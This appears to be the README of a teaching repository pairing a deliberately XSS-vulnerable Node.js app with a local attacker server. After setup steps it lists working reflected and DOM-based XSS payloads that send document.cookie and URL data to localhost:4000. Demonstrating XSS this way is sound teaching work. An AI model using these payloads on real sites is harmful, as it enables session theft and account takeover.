This repository contains a sample web application with Cross-Site Scripting (XSS) vulnerabilities and its attacker website.

---
### Technology

This project uses the following technologies:

-  [Node.js](https://nodejs.org/)

### Running the Application

2. Move to the root folder of the project (`xss-sample-app`) in your machine and install the dependencies by running the following command:

   ```shell
   npm install
   ```

3. To launch the web application, run the following command:

   ```shell
   node server.js
   ```

4. Point your browser to [http://localhost:3000](http://localhost:3000) to access the sample web app.

5. To launch the attacker website, run the following command:

   ```shell
   node attacker-server.js
   ```

6. Point your browser to [http://localhost:4000](http://localhost:4000/) to access the attacker website


### Reflected XSS

#### Injecting the malicious code:
`<script>fetch(`http://localhost:4000?data=${encodeURIComponent(window.location.search)}`)</script>`


### What if malicious code looks like:
`<script>fetch(`http://localhost:4000?data=${document.cookie}`)</script>`

#### DOM based XSS

#### Injecting the malicious code:
insert the following string in the search box, and click the Go button:

`<img src="noimage" onerror=fetch(`http://localhost:4000?data=${document.cookie}`)></img>`

